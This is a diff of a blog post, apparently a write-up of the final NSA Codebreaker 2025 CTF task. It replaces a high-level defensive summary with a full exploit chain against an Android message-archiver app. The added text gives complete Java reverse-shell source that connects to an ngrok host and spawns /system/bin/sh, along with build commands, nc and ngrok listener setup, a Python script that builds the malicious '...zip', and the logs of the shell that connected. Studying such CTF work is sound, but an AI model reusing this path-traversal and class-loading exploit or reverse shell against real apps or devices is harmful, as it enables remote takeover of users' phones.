@@ -9,38 +9,235 @@ tags: ["NSA Codebreaker 2025", "ctf", "android security"]
 
 [← Series overview](/posts/nsa-codebreaker-2025/)
 
-The final task supplied a **custom Android APK** used to archive chat messages. It brought together application reverse engineering, archive handling, and reasoning about how data moves through a program.
+<!-- Paste your Markdown content below this line. -->
 
-### Starting with the application
+# Task 7 - Finale - (Vulnerability Research, Exploitation)
 
-I first reviewed the supplied dependency licenses. An old library looked like a promising lead, but my notes make clear that the decisive issue emerged from examining the application's own handling of files.
+> Now that we have access to the hidden channel the adversary is using, our military counterparts want to act quickly to destroy the adversary's capacity to continue with their attack against our military networks.
 
-That was a useful correction to my initial approach. Dependency age can guide investigation, but it does not establish which behavior is responsible for a vulnerability.
+> Analysts have been quickly scrutinizing the data from the privileged channel. They conclude that the adversary has downloaded a custom app to archive all messages sent in the channel locally to their phone. They have also surmised the adversary is running a recent version of Android on a Google Pixel phone. This is the opportunity we have been waiting for! If we can devise a way to exploit on to the adversary's device we will have the advantage.
 
-### The underlying security problem
-
-At a high level, the app failed to keep archive extraction reliably contained within its intended directory. It also dynamically loaded format-handling code from writable storage. Those behaviors created a dangerous relationship between **untrusted archived data** and **executable application components**.
-
-The impact depended on their interaction. File handling was not merely a storage concern once writable content could influence which code the application loaded.
-
-### Validation in the challenge environment
-
-My original notes record testing with an Android emulator and completing the final challenge. This post focuses on the root cause and lessons from that analysis, rather than reproducing the payload or delivery procedure.
-
-### Defensive implications
-
-Archive processing should resolve and validate extraction destinations, ensuring every output remains inside the intended directory. Applications should also prevent downloaded content from replacing trusted components.
-
-Dynamic code loading requires a separate trust decision: a writable cache is not inherently a trusted source of executable code. Keeping executable components separate from untrusted content, and verifying their provenance, reduces the risk that an input file can cross that boundary.
-
-### What I took away
-
-Task 7 reinforced the value of tracing the full execution flow. A file's name, extraction destination, overwrite behavior, and eventual use all mattered to the application's security.
-
-Finishing the challenge brought the investigation full circle—from a suspicious filesystem artifact to understanding how an application could turn untrusted content into execution.
+> Another team has retrieved the custom application APK file for you to analyze.
 
 ---
 
-Based on my [Task 7 repository notes](https://github.com/XSS3cut10n3r/My-NSA-Codebreaker-2025/blob/main/task7.md).
+## Downloads
 
-[← Task 6](/posts/nsa-codebreaker-2025-task-6/) · [Series overview](/posts/nsa-codebreaker-2025/)
+- **Custom App:** `mmarchiver.apk`
+- **Licenses:** `licenses.txt`
+
+---
+
+## Task
+
+- **Submit a file to be posted to the Mattermost Channel that will be processed by the app and exploits the device.**
+
+---
+
+## Writeup
+
+This task required reverse engineering an Android application to discover vulnerabilities and chain them into a remote code execution exploit.
+
+### Initial Analysis
+
+Initially, I started with scanning licenses.txt to see what exactly we're working with. I also used a python script to scan the licenses for vulnerabilities. `Appache commons io 1.3.2` was the only one which seemed to be far far older than it should've been, and it had `CVE-2021-29425` a path traversal vulnerability to go with it. I thought this would be the exact vulnerability, but it turned out to just be a lead that pointed me toward looking for path traversal issues.
+
+I then began by decompiling the APK using jadx-gui. The application is heavily obfuscated, and really ugly in JADX. Below we see the FileDownloadWorker for the Mattermost message archiver app, which was one of the nicer looking functions. We know from the task description that the app automatically downloads files from channels and "archives them" - it does _something_ with them, that's what we need to exploit.
+
+<p align="center">
+<img src="/images/codebreaker-2025/jadx_overview.png" alt="JADX Overview"/>
+</p>
+
+Examining the source code further revealed a custom archive format system with dynamic class loading for different file types (zip, 7z, tar, etc.). The format handlers are loaded from `/cache/zippier/formats/` and implement the `ZipFormat` interface:
+```java
+public interface ZipFormat {
+    String getExtension();
+    void uncompress(File file, File file2, ZipFile zipFile);
+}
+```
+
+### Vulnerability Discovery
+
+Analyzing the file extraction code, I identified a critical path traversal vulnerability. When processing zip files, the app creates an extraction directory using the filename:
+```java
+File extractDir = new File(cacheDir, getBasename(zipFile.getName()));
+```
+
+For a file named `...zip`, the basename is `..`, resulting in an extraction path of `/cache/zippier/extract/..`, which resolves to `/cache/zippier/`. This means files within the zip are extracted to the parent directory.
+
+<p align="center">
+<img src="/images/codebreaker-2025/path_traversal.png" alt="Path Traversal"/>
+</p>
+
+The extraction process uses `FileOutputStream` without checking if files already exist, allowing arbitrary file overwrites. Additionally, I discovered that when the app encounters a `.7z` file, it attempts to load a format handler from `/cache/zippier/formats/net.axolotl.zippier.ZipFormat_7z.jar`.
+
+### Exploitation Chain
+
+The vulnerability chain:
+
+1. **Path Traversal**: Name the zip file `...zip` to extract to `/cache/zippier/` instead of a subdirectory
+2. **File Overwrite**: Place a malicious JAR at `formats/net.axolotl.zippier.ZipFormat_7z.jar` within the zip
+3. **Dynamic Class Loading**: Include a trigger file with `.7z` extension
+4. **Code Execution**: The static initializer in the malicious class executes when loaded
+
+<p align="center">
+<img src="/images/codebreaker-2025/exploitation_flow.png" alt="Exploitation Flow"/>
+</p>
+
+### Creating the Malicious Payload
+
+I created a properly implemented `ZipFormat_7z` class that executes a reverse shell in its static initializer:
+```java
+package net.axolotl.zippier;
+
+import java.io.*;
+import java.net.Socket;
+
+public class ZipFormat_7z implements ZipFormat {
+    
+    static {
+        try {
+            reverseShell();
+        } catch (Exception e) {}
+    }
+    
+    public String getExtension() {
+        return "7z";
+    }
+    
+    public void uncompress(File file, File file2, ZipFile zipFile) {
+        // Required to implement interface
+    }
+    
+    private static void reverseShell() {
+        try {
+            Socket socket = new Socket("8.tcp.ngrok.io", 19757);
+            Process process = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-i"});
+            
+            InputStream processIn = process.getInputStream();
+            OutputStream processOut = process.getOutputStream();
+            InputStream socketIn = socket.getInputStream();
+            OutputStream socketOut = socket.getOutputStream();
+            
+            new Thread(() -> {
+                try {
+                    byte[] buf = new byte[8192];
+                    int len;
+                    while ((len = socketIn.read(buf)) > 0) {
+                        processOut.write(buf, 0, len);
+                        processOut.flush();
+                    }
+                } catch (Exception e) {}
+            }).start();
+            
+            new Thread(() -> {
+                try {
+                    byte[] buf = new byte[8192];
+                    int len;
+                    while ((len = processIn.read(buf)) > 0) {
+                        socketOut.write(buf, 0, len);
+                        socketOut.flush();
+                    }
+                } catch (Exception e) {}
+            }).start();
+        } catch (Exception e) {}
+    }
+}
+```
+
+I compiled the Java code to `.class` files and used Android SDK's `d8` tool to convert to DEX format:
+```bash
+javac ZipFormat_7z.java ZipFile.java
+mkdir -p net/axolotl/zippier
+mv ZipFormat_7z.class net/axolotl/zippier/
+d8 net/axolotl/zippier/ZipFormat_7z.class
+```
+
+### Network Configuration
+
+Since the target device would be on the NSA's network, I used ngrok to create a publicly accessible TCP tunnel:
+```bash
+ngrok tcp 4444
+```
+
+This provided `tcp://8.tcp.ngrok.io:19757` which forwards to my local netcat listener:
+```powershell
+nc -lvnp 4444
+```
+
+<p align="center">
+<img src="/images/codebreaker-2025/ngrok_tunnel.png" alt="Ngrok Tunnel"/>
+</p>
+
+### Building the Exploit Archive
+
+I created the final exploit structure:
+```python
+#!/usr/bin/env python3
+import zipfile
+
+# Package DEX into JAR format
+with zipfile.ZipFile('malicious.jar', 'w') as jar:
+    jar.write('classes.dex', 'classes.dex')
+
+# Create exploit zip named '...zip'
+with zipfile.ZipFile('temp.zip', 'w') as z:
+    with open('malicious.jar', 'rb') as f:
+        z.writestr('formats/net.axolotl.zippier.ZipFormat_7z.jar', f.read())
+    z.writestr('trigger.7z', b'\x37\x7A\xBC\xAF\x27\x1C')
+
+import os
+os.rename('temp.zip', '...zip')
+```
+
+The resulting `...zip` contains:
+- `formats/net.axolotl.zippier.ZipFormat_7z.jar` - Malicious format handler
+- `trigger.7z` - Triggers the format loading mechanism
+
+### Local Testing
+
+Before submission, I tested the exploit locally using an Android emulator and I set up a local Mattermost instance using Docker to simulate the adversary's environment. 
+
+<p align="center">
+<img src="/images/codebreaker-2025/mattermost_local.png" alt="Mattermost Local"/>
+</p>
+
+The logcat output confirmed successful exploitation:
+```
+D FileDownloadWorker: file written to /data/user/0/com.badguy.mmarchiver/cache/download/...zip
+D a: processing zip archive /data/user/0/com.badguy.mmarchiver/cache/download/...zip
+D a: processing zip entry formats/net.axolotl.zippier.ZipFormat_7z.jar
+D a: processing zip entry trigger.7z
+D d: attempting format load from /data/user/0/com.badguy.mmarchiver/cache/zippier/formats/net.axolotl.zippier.ZipFormat_7z.jar
+```
+
+<p align="center">
+<img src="/images/codebreaker-2025/logcat_success.png" alt="Logcat Success"/>
+</p>
+
+The reverse shell connected successfully:
+```
+PS C:\Users\Bodwell\Downloads> .\nc64.exe -nlvp 4444
+listening on [any] 4444 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 57738
+whoami
+u0_a217
+id
+uid=10217(u0_a217) gid=10217(u0_a217) groups=10217(u0_a217)
+pwd
+/
+```
+
+<p align="center">
+<img src="/images/codebreaker-2025/shell_connected.png" alt="Shell Connected"/>
+</p>
+
+### Submission
+
+With the exploit verified locally, I submitted `...zip` to the NSA Codebreaker platform.
+
+<p>
+<img src="/images/codebreaker-2025/badge7.png" alt="Badge" width="300"/>
+</p>
+
+**Success!** The exploitation chain successfully achieved remote code execution on the adversary's device, completing the final task of the NSA Codebreaker Challenge.
